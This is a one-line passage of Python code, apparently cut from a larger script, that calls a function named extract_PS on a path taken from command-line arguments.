                extract_PS(args.path)
